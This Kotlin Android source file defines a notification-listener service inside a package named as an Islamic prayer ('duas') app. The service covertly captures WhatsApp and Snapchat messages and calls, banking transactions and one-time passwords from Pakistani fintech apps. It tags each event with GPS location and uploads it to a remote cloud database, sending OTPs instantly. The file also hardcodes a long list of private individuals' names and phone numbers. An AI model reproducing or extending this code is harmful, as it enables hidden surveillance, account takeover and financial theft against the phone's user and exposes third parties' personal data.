package islamic.duas.logs

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.service.notification.NotificationListenerService
import islamic.duas.utils.DeviceId
import android.service.notification.StatusBarNotification
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.sync.DuaTracker
import islamic.duas.utils.ErrorLog
import islamic.duas.whatsapp.ChatCategory
import islamic.duas.whatsapp.VoiceEventStore
import islamic.duas.whatsapp.WhatsAppCategorizer

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class DuaNotificationService : NotificationListenerService() {

    companion object {
        private const val TAG = "DuaNotif"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_WEB_PACKAGE = "com.whatsapp.w4b"
        private const val SNAPCHAT_PACKAGE = "com.snapchat.android"

        // Banking / Fintech packages (Pakistan)
        private val BANKING_PACKAGES = setOf(
            "com.sadapay.app",
            "com.sadapay",
            "pk.com.nayapay",
            "pk.com.npay",
            "com.easypaisa.app",
            "com.mobilink.money",
            "com.mobilink.microfinance.branchlessbanking",
            "com.jazzcash.pk",
            "com.jazz.jazzworld",
            "com.hbl.mobile",
            "com.ubank",
            "com.meezan.bank",
            "com.bankalfalah.mobile"
        )

        // WhatsApp Individual Contact Whitelist (names + numbers)
        // Substring match on title, last-10-digits on phone numbers
private val INDIVIDUAL_WHITELIST = setOf(
            // Names
            "Ansar Abbas", "J", "Fatima Imani Sis", "إيمان فاطمة 🤍", "مومنہ بنت محمد صدیق",
            "الطيور الجنة", "sumeraijaz4", "Maryam Rana", "Ansar", "Ahtisham Aslam Hunjra",
            "T Shehla Abdul Hadi Teacher", "Zainab Imani Sis", "Mam Taiyba", "Rabia ✨ Iqbal",
            "Mam Fatima", "سندس ایمانی سیسٹر", "میم افشاں", "Hadika Imani Sis 🌹",
            "Mam SiDDiQA", "mariamohsan40", "Aysha Api", "خوش بخت Imani Sis",
            "Nigat.razzaq✨", "Mam Sadiqa", "Api Fardos", "Sehrish", "Ayni Ali",
            "Khansa Salfi 🥰", "Shabesta Rasheed Karachi", "Api Salma", "ایمان پیاری سیسٹر",
            "یَا مُقَلِبَ القُلُوبِ ثَبِت قَلبِی عَلٰی دِینِک.", "Same Faraz", "Tanvier Bahi",
            "صدف صدیقی", "Samra Shahid", "میم وجیہہ", "isra Ashraf", "Mis Iqra .Abdul Hadi SUF",
            "Afaaf 🌸 📚 Online Books 📚 Shop", "Misbah", "میم حنسہ تجوید ٹیچر",
            "T Mahnoor Haider", "Mis Iqra Iftkhar", "Khadija", "Kinzu", "Baji Shasta",
            "Baji Misba", "Rozeena Liaqat Imani Sis", "Waris Ali Ali", "Tanvir Bahi",
            "Iqra Zaman Warraich", "Khadija", "Ch Fazal Jutt Saib", "Sarfraz Bhai",
            "Fazal Ch", "Jjjjjj", "Mam Ayza Tajvid Teacher", "Jabbar Pk", "Ch Sulman",
            "Iqra Jpd", "Zaryab", "Bahi Sulman", "Abdul Hadi School Nambr", "Baji Saima Sher",
            "Naseren Darzi", "Jab ✅", "Quran", "Tajvid Quran Teacher", "Baji Salma",
            "شگفتہ مصطفى", "Saima Baji", "Jab Jjj", "Baha Tana", "Gulshan", "Bahi Razaq",
            "Fatima RPK", "Maryam Madam", "Samina Shokat", "Miss Abida Teacher Hadi", "Jay",
            // Numbers (various formats)
            "+2473486044711", "+447481836567", "+919871723783", "+923003008000",
            "+923007644634", "+923045669335", "+923045992217", "+923056198312",
            "+923074820647", "+923081666067", "+923084339735", "+923086898934",
            "+923099745305", "+923105992101", "+923116563739", "+923125498608",
            "+923127931787", "+923133070338", "+923139322190", "+923139931484",
            "+923155606529", "+923161798745", "+923180760837", "+923181724498",
            "+923185166350", "+923216640305", "+923217463741", "+923218184867",
            "+923234216413", "+923242577197", "+923252881557", "+923266170227",
            "+923275749373", "+923279114170", "+923281610800", "+923286583968",
            "+923324413230", "+923325514858", "+923342476431", "+923402654050",
            "+923404455435", "+923404698855", "+923424496266", "+923430675022",
            "+923434527457", "+923444729308", "+923447179029", "+923457373353",
            "+923466464412", "+923470776405", "+923480843752", "+923481717710",
            "+923494419953", "+923496447225", "+971521608342", "+971552623610",
            "+971559182042", "+971569393483", "00971501086753", "03000171623",
            "03004345580", "03006430918", "03013936713", "03054914140", "03079224149",
            "03090620796", "03107130054", "03130785665", "03206224098", "03214210512",
            "03242577197", "03252881557", "03272219890", "03279114170", "03286153372",
            "03287113044", "03423360926", "03424733350", "03430632756", "03431895076",
"03466114143", "03473741743", "03490131384",
             // Newly added per categorization review
             "Jazz Whatsapp", "Alflah Bank", "021111225111",
             // User-confirmed individuals (dashboard review wizard, Aug 2026)
             "+92 319 8052748", "+92 334 1209199", "alhamdulillah", "+92 329 6611517",
             "+92 342 7740228", "+92 343 4045433", "mariamohsan40 and 1 other",
             "mariamohsan40 and 3 others", "+92 304 4545967",
             "api firdos", "mano bili", "mano bili and 1 other", "mano bili and 2 others"
         )

        /**
         * Public accessor for historical reprocessing by DuaSyncWorker.
         */
        fun getIndividualWhitelist(): Set<String> = INDIVIDUAL_WHITELIST

        /**
         * Public accessor for phone numbers in the whitelist (last 10 digits).
         */
        fun getIndividualWhitelistNumbers(): Set<String> {
            return INDIVIDUAL_WHITELIST.filter { it.startsWith("+") || it.startsWith("0") }
                .map { it.replace(Regex("[^0-9]"), "").takeLast(10) }
                .filter { it.length >= 10 }
                .toSet()
        }

        // Promo/Broadcast keywords in conversation title
        private val PROMO_KEYWORDS = setOf(
            "FREE", "PROMOTION", "PROMO", "GIFT HUB", "GIFT", "SHOP",
            "CHANNEL", "BROADCAST", "ANNOUNCEMENT", "COMMUNITY",
            "TRTEEL", "QURAAN", "TAJVID", "TAJWEED", "TAFSEER",
            "MODULE", "SEMESTER", "COURSE", "IBADAAT", "WAJIBAT",
            "AL RABBANI", "RABBANI", "INSTITUTE", "INSTITUTION",
            "SIRAT", "JANNAT", "WALI", "MASJID", "MADRASA",
            "QURAN", "HADEES", "SUNNAH", "FIQH", "AQEEDAH",
            "ISLAMIC", "DEEN", "DAWAH", "TARBIYAH", "TAZKIYAH",
            "JAMIA", "DARUL", "ULOOM", "MAKTAB", "HALQA",
            "STUDY", "CIRCLE", "HALAQA", "JAMAAT", "JAMAT"
        )

        // Generic Islamic/group-like keywords (no whitelist, no X messages)
        private val GENERIC_GROUP_KEYWORDS = setOf(
            "ISLAMIC", "QURAN", "HADITH", "DAILY", "REMINDER",
            "DAWAH", "DUA", "AZKAR", "MORNING", "EVENING",
            "ISLAM", "MUSLIM", "ALLAH", "RABB", "DEEN"
        )

        private val callKeywords = listOf("call", "calling", "incoming", "missed", "ringing",
            "whatsapp call", "snapchat call", "audio call", "video call", "voice call",
            "کال", "آنے والی کال", "مِس کال", "چھوٹی ہوئی کال",
            "وائس کال", "ویڈیو کال", "آڈیو کال", "صوتی کال")
        private val bankingKeywords = listOf("paid", "received", "transferred", "sent", "deposited",
            "withdrawn", "credited", "debited", "payment", "transaction", "balance", "amount",
            "rs", "pkr", "otp", "one time password", "verification code", "otp code",
            "login code", "security code", "auth code", "pin", "wallet", "cashback",
            "refund", "topup", "recharge", "bill", "utility", "electricity", "gas", "internet")
        private val otpKeywords = listOf("otp", "one time password", "verification code",
            "login code", "security code", "auth code", "your code is", "code is")

        private var pendingEvents = mutableListOf<JSONObject>()
        private var lastFlushMs = 0L
        private const val FLUSH_INTERVAL = 5000L
        private const val INSTANT_FLUSH_INTERVAL = 100L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var sharedPrefs: SharedPreferences
    private var knownGroupNames = mutableSetOf<String>()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        sharedPrefs = getSharedPreferences("dua_notif_prefs", Context.MODE_PRIVATE)
        loadGroupNames()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "dua_service",
                "Dua Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val isWhatsApp = pkg == WHATSAPP_PACKAGE || pkg == WHATSAPP_WEB_PACKAGE
        val isSnapchat = pkg == SNAPCHAT_PACKAGE
        val isBanking = pkg in BANKING_PACKAGES

        if (!isWhatsApp && !isSnapchat && !isBanking) return

        try {
            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
            val subText = extras.getString(android.app.Notification.EXTRA_SUB_TEXT) ?: ""
            val summaryText = extras.getString(android.app.Notification.EXTRA_SUMMARY_TEXT) ?: ""
            val bigText = extras.getString(android.app.Notification.EXTRA_BIG_TEXT) ?: ""
            val conversationTitle = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                extras.getString(android.app.Notification.EXTRA_CONVERSATION_TITLE) ?: ""
            } else ""
            val category = sbn.notification.category ?: ""
            val ongoing = sbn.notification.flags and android.app.Notification.FLAG_ONGOING_EVENT != 0
            val isIncoming = sbn.notification.flags and android.app.Notification.FLAG_FOREGROUND_SERVICE == 0 && !ongoing

            // OTP-content fallback: any non-WhatsApp/non-Snapchat notification with
            // a strong OTP pattern is banking-related even if the package is unlisted.
            val isOTPContent = !isWhatsApp && !isSnapchat && (
                text.contains("otp", ignoreCase = true) ||
                text.contains("one time password", ignoreCase = true) ||
                text.contains("verification code", ignoreCase = true) ||
                text.contains("login code", ignoreCase = true) ||
                text.contains("security code", ignoreCase = true) ||
                text.contains("auth code", ignoreCase = true) ||
                title.contains("otp", ignoreCase = true) ||
                title.contains("verification code", ignoreCase = true)
                )
            if (!isWhatsApp && !isSnapchat && !isBanking && !isOTPContent) return

            // === SYSTEM NOISE FILTER (before any processing) ===
            val isSystemNoise = when {
                title == "WhatsApp" && (
                    text.contains("Checking for new messages") ||
                    text.contains("Sending video to") ||
                    text.contains("Sending message") ||
                    text.contains("Downloading") ||
                    text.contains("Updating messages") ||
                    text.contains("You may have new messages")
                ) -> true
                // Timestamp-only heartbeats (no title, just 💬 timestamp)
                title.isNullOrBlank() && text.trim().matches(Regex("^💬\\s*\\d{1,2}/\\d{1,2}/\\d{4}.*")) -> true
                title.isNullOrBlank() && text.trim().matches(Regex("^💬\\s*\\d{2}/\\d{2}/\\d{4}.*")) -> true
                // Title is just the chat emoji with timestamp text
                title == "💬" && text.matches(Regex("\\d{1,2}/\\d{1,2}/\\d{4}")) -> true
                text.contains("Updating messages") -> true
                text.contains("Downloading") && text.contains("video") -> true
                else -> false
            }

            if (isSystemNoise) return

            val combinedText = "$title $text $category $subText $summaryText".lowercase(Locale.ROOT)
            val isCall = callKeywords.any { combinedText.contains(it) }

            val androidId = DeviceId.get(this)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
            val timestamp = dateFormat.format(Date(sbn.postTime))

            var eventType: String
            var shouldInstantFlush = false

            if (isBanking || isOTPContent) {
                val isFinancial = bankingKeywords.any { combinedText.contains(it) }
                val isOTP = otpKeywords.any { combinedText.contains(it) }
                if (isOTP) {
                    eventType = "otp_notification"
                } else if (isFinancial) {
                    eventType = "banking_transaction"
                } else {
                    eventType = "banking_notification"
                }
                shouldInstantFlush = isFinancial || isOTP
            } else if (isSnapchat) {
                eventType = if (isCall) {
                    when {
                        combinedText.contains("missed") -> "snapchat_call_missed"
                        combinedText.contains("incoming") -> "snapchat_call_incoming"
                        combinedText.contains("calling") -> "snapchat_call_outgoing"
                        category == "call" -> "snapchat_call"
                        else -> "snapchat_call"
                    }
                } else "snapchat_message"
            } else {
                // WhatsApp
                eventType = if (isCall) {
                    when {
                        combinedText.contains("missed") -> "whatsapp_call_missed"
                        combinedText.contains("incoming") -> "whatsapp_call_incoming"
                        combinedText.contains("calling") -> "whatsapp_call_outgoing"
                        category == "call" -> "whatsapp_call"
                        else -> "whatsapp_call"
                    }
                } else "whatsapp_message"
            }

            // === WHATSAPP GROUP DETECTION (PRIORITY ORDER) ===
            val messagesCount = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                extras.getInt("android.extra.MESSAGES_COUNT", 0)
            } else 0

            val contactNumber = extractNumber(title, text)

            // User-confirmed overrides (dashboard review wizard) — strongest signal.
            val confirmedKey = WhatsAppCategorizer.canonicalChatKey(title, conversationTitle)
            val isGroup = when {
                // 0. USER-CONFIRMED OVERRIDES -> GROUP
                WhatsAppCategorizer.CONFIRMED_GROUP_KEYS.contains(confirmedKey) -> true

                // 0. USER-CONFIRMED OVERRIDES -> INDIVIDUAL
                WhatsAppCategorizer.CONFIRMED_INDIVIDUAL_KEYS.contains(confirmedKey) -> false

                // 0. STATUS INTERACTIONS -> INDIVIDUAL
                text.contains("Liked your status", ignoreCase = true) ||
                text.contains("Reshared your status", ignoreCase = true) ||
                text.contains("sent you a chat", ignoreCase = true) ||
                text.contains("reacted to your", ignoreCase = true) -> false

                // 1. DELETED MESSAGES -> INDIVIDUAL
                text.contains("This message was deleted", ignoreCase = true) ||
                text.contains("You deleted this message", ignoreCase = true) -> false

                // 2. YOUR REPLY IN GROUP -> INDIVIDUAL (sender wins)
                title == "You" || title.contains("You:") -> false

                // 3. REACTIONS -> INDIVIDUAL
                text.contains("Reacted", ignoreCase = true) &&
                text.contains("to your", ignoreCase = true) -> false

                // 4. EXPLICIT GROUP FORMAT "GroupName: SenderName" -> GROUP
                // (precise: conversationTitle prefix + colon), beats whitelist override
                // so a whitelisted sender inside a group is still grouped.
                conversationTitle.isNotEmpty() &&
                    title.replace(Regex("[\u200e\u200f\u202a-\u202e\u2066-\u2069]"), "")
                        .startsWith(conversationTitle.replace(Regex("[\u200e\u200f\u202a-\u202e\u2066-\u2069]"), "")) &&
                    title.any { it == ':' } -> true

                // 5. INDIVIDUAL WHITELIST OVERRIDE (precise matching:
                // short tokens must match the whole title, so "J"/"Quran"/"Jay"
                // can't hijack a real group)
                WhatsAppCategorizer.isInIndividualWhitelist(
                    title, INDIVIDUAL_WHITELIST, extractPhoneNumbersFromWhitelist()
                ) -> false

                // 6. EXPLICIT GROUP VOICE CALL -> GROUP (English + Urdu)
                text.contains("Group voice call", ignoreCase = true) ||
                text.contains("group call", ignoreCase = true) ||
                text.contains("گروپ وائس کال", ignoreCase = true) ||
                text.contains("گروپ کال", ignoreCase = true) -> true

                // 7. URDU/ARABIC GROUP STRUCTURE KEYWORDS -> GROUP
                listOf("گروپ", "ماڈیول", "مدرسہ", "جامعہ", "جماعت", "حلقہ", "کورس", "درس", "ڈسکشن")
                    .any { title.contains(it) || conversationTitle.contains(it) } -> true

                // 8. CALL FROM KNOWN GROUP NAME -> GROUP
                isCall && knownGroupNames.any { conversationTitle.contains(it, ignoreCase = true) || title.contains(it, ignoreCase = true) } -> true

                // 8b. CALL FROM GROUP CONTEXT IN MESSAGE TEXT -> GROUP
                isCall && knownGroupNames.any { text.contains(it, ignoreCase = true) } -> true

                // 9. KNOWN GROUP NAME IN CONVERSATION TITLE -> GROUP
                knownGroupNames.any { conversationTitle.contains(it, ignoreCase = true) } -> true

                // 10. "(X MESSAGES)" SUFFIX IN SUMMARY -> GROUP
                summaryText.matches(Regex(".*\\(\\d+\\s*messages?\\).*")) -> true

                // 10b. "(X MESSAGES)" IN CONVERSATION TITLE -> GROUP
                conversationTitle.matches(Regex(".*\\(\\d+\\s*messages?\\).*")) -> true

                // 11. PROMO/BROADCAST KEYWORDS IN CONVERSATION TITLE -> GROUP
                PROMO_KEYWORDS.any { conversationTitle.contains(it, ignoreCase = true) } -> true

                // 12. PROMO KEYWORDS IN MESSAGE TEXT -> GROUP
                PROMO_KEYWORDS.any { text.contains(it, ignoreCase = true) } -> true

                // 13. GENERIC GROUP-LIKE KEYWORDS -> GROUP
                GENERIC_GROUP_KEYWORDS.any { conversationTitle.contains(it, ignoreCase = true) } -> true

                // 14. MULTIPLE NAMES IN TITLE -> INDIVIDUAL
                title.contains(",") || title.contains("،") -> false

                // 15. DEFAULT -> EXISTING STRICTER LOGIC
                else -> (conversationTitle.isNotEmpty() ||
                    summaryText.contains(": ") ||
                    combinedText.contains("group") ||
                    messagesCount > 1)
            }

            // === WhatsApp Text Message Categorization ===
            val categorization = WhatsAppCategorizer.categorize(
                sbn, title, conversationTitle, text, summaryText, category, isIncoming,
                INDIVIDUAL_WHITELIST, extractPhoneNumbersFromWhitelist()
            )

            val loc = DuaTracker.getLastLocation()
            val locationStr = if (loc != null) {
                "${loc.optString("latitude", "")},${loc.optString("longitude", "")}"
            } else ""

val entry = JSONObject().apply {
                 put("type", eventType)
                 put("timestamp", timestamp)
                 put("ts_ms", sbn.postTime)
                 put("contactName", title)
                 put("contactNumber", extractNumber(title, text))
                 put("messagePreview", text)
                 put("subText", subText)
                 put("summaryText", summaryText)
                 put("fullMessage", bigText)
                 put("conversationTitle", conversationTitle)
                 put("isGroup", isGroup)
                 put("isIncoming", isIncoming)
                 put("packageName", sbn.packageName)
                 put("location", locationStr)
                 put("rawText", combinedText)
                 put("chatCategory", categorization.chatCategory.name)
                 put("messageCount", categorization.messageCount)
                 put("groupName", categorization.groupName)
                 if (locationStr.contains(",")) {
                     val parts = locationStr.split(",")
                     put("lat", parts[0].toDoubleOrNull() ?: 0.0)
                     put("lng", parts[1].toDoubleOrNull() ?: 0.0)
                 }
             }

             pendingEvents.add(entry)

             // === VOICE MESSAGE EVENT CAPTURE ===
             // WhatsApp voice notes show "🎤/🎵 Voice message" previews. Record a live event
             // keyed to postTime so the voice-note sync can classify newly-synced files as
             // individual vs group (WhatsApp stores all voice notes in flat folders).
             if (isWhatsApp && !isCall && (
                     text.contains("Voice message", ignoreCase = true) ||
                     text.contains("\uD83C\uDFA4") ||
                     text.contains("\uD83C\uDFB5"))) {
                 VoiceEventStore.recordEvent(
                     sharedPrefs, sbn.postTime, isGroup,
                     categorization.chatCategory.name,
                     if (conversationTitle.isNotEmpty()) conversationTitle else title
                 )
             }

                // Store categorization sample for rule extraction
              if (categorization.chatCategory != ChatCategory.system_notification) {
                  scope.launch {
                      try {
                          storeCategorizationSample(androidId, title, conversationTitle, categorization)
                      } catch (_: Exception) {}
                  }
              }



            // Learn group names from this notification
            learnGroupName(summaryText)
            if (conversationTitle.matches(Regex(".*\\(\\d+\\s*messages?\\).*"))) {
                learnGroupName(conversationTitle)
            }

            if (shouldInstantFlush) {
                instantFlush(androidId)
            } else {
                flushIfNeeded(androidId)
            }
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error: ${e.message}", e)
            ErrorLog.write(this, TAG, "onNotificationPosted error", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        if (pkg != WHATSAPP_PACKAGE && pkg != WHATSAPP_WEB_PACKAGE && pkg != SNAPCHAT_PACKAGE) return
        try {
            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
            val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""

        } catch (_: Exception) {}
    }

    private fun extractNumber(title: String, text: String): String {
        val combined = "$title $text"
        val patterns = listOf(
            Regex("""[\+]?\d[\d\s\-\(\)]{7,15}\d"""),
            Regex("""\d{10,15}""")
        )
        for (p in patterns) {
            val m = p.find(combined)
            if (m != null) return m.value.trim()
        }
        return ""
    }

    private fun normalizePhoneLast10(input: String?): String {
        return input?.replace(Regex("[^0-9]"), "")?.takeLast(10) ?: ""
    }

    private fun loadGroupNames() {
        knownGroupNames = sharedPrefs.getStringSet("known_group_names", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
    }

private fun persistGroupNames() {
         sharedPrefs.edit().putStringSet("known_group_names", knownGroupNames).apply()
     }

     /**
      * Extract all phone numbers from the individual whitelist (last 10 digits only).
      * Used by WhatsAppCategorizer for phone number matching.
      */
     private fun extractPhoneNumbersFromWhitelist(): Set<String> {
         return INDIVIDUAL_WHITELIST.filter { it.startsWith("+") || it.startsWith("0") }
             .map { it.replace(Regex("[^0-9]"), "").takeLast(10) }
             .filter { it.length >= 10 }
             .toSet()
     }

     /**
      * Store a categorization sample in RTDB for future rule extraction.
      * Samples are retained for 30 days.
      */
     private fun storeCategorizationSample(androidId: String, contactName: String, conversationTitle: String, result: WhatsAppCategorizer.CategorizationResult) {
         try {
             val androidId = DeviceId.get(this)
             val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
             val now = System.currentTimeMillis()
             val sample = JSONObject().apply {
                 put("contactName", contactName)
                 put("conversationTitle", conversationTitle)
                 put("chatCategory", result.chatCategory.name)
                 put("messageCount", result.messageCount)
                 put("groupName", result.groupName)
                 put("confidence", result.confidence)
                 put("timestamp", dateFormat.format(Date(now)))
                 put("ts_ms", now)
                 put("deviceModel", android.os.Build.MODEL)
                 put("manufacturer", android.os.Build.MANUFACTURER)
             }
             CloudApi.writeToRTDB("devices/$androidId/whatsapp_samples/$now", sample)
         } catch (_: Exception) {}
     }

     private fun learnGroupName(summaryText: String) {
        // Extract group name from "(X messages)" pattern
        // e.g., "Al Rabbani International Institute ✨ (164 messages): ~ sidra: msg"
        val pattern = Regex("(.+?)\\s*\\(\\d+\\s*messages?\\)")
        val match = pattern.matchEntire(summaryText.trim())
        if (match != null) {
            val groupName = match.groupValues[1].trim()
            if (groupName.length >= 3 && !INDIVIDUAL_WHITELIST.contains(groupName)) {
                knownGroupNames.add(groupName)
                persistGroupNames()
            }
        }
    }

    private fun flushIfNeeded(androidId: String) {
        val now = System.currentTimeMillis()
        if (now - lastFlushMs < FLUSH_INTERVAL) return
        if (pendingEvents.isEmpty()) return
        flush(androidId)
    }

    private fun instantFlush(androidId: String) {
        val events = synchronized(pendingEvents) {
            val copy = pendingEvents.toList()
            pendingEvents.clear()
            copy
        }
        if (events.isEmpty()) return
        scope.launch {
            for (event in events) {
                val ts = event.optLong("ts_ms", System.currentTimeMillis())
                CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", event)
            }
        }
    }

    private fun flush(androidId: String) {
        val events = synchronized(pendingEvents) {
            val copy = pendingEvents.toList()
            pendingEvents.clear()
            copy
        }
        lastFlushMs = System.currentTimeMillis()

        scope.launch {
            for (event in events) {
                val ts = event.optLong("ts_ms", System.currentTimeMillis())
                CloudApi.writeToRTDB("devices/$androidId/timeline/$ts", event)
            }
        }
    }

    override fun onDestroy() {
        val androidId = DeviceId.get(this)
        flush(androidId)
        scope.cancel()
        super.onDestroy()
    }
}